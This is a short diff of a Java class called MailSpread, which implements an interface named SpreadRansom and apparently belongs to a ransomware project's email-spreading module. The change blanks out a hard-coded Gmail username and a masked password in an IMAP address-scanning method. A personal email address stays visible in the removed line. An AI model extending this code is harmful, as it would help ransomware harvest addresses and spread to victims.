@@ -11,8 +11,8 @@ public class MailSpread implements SpreadRansom {
 	public Collection<String> scanEmailAdress() {
 		Properties props = new Properties();
 		String host = "localhost";
-		String username = "osherlev317@gmail.com";
-		String password = "**************";
+		String username = "";
+		String password = "";
 
 		// String provider = "pop3";
 		String provider = "imap";
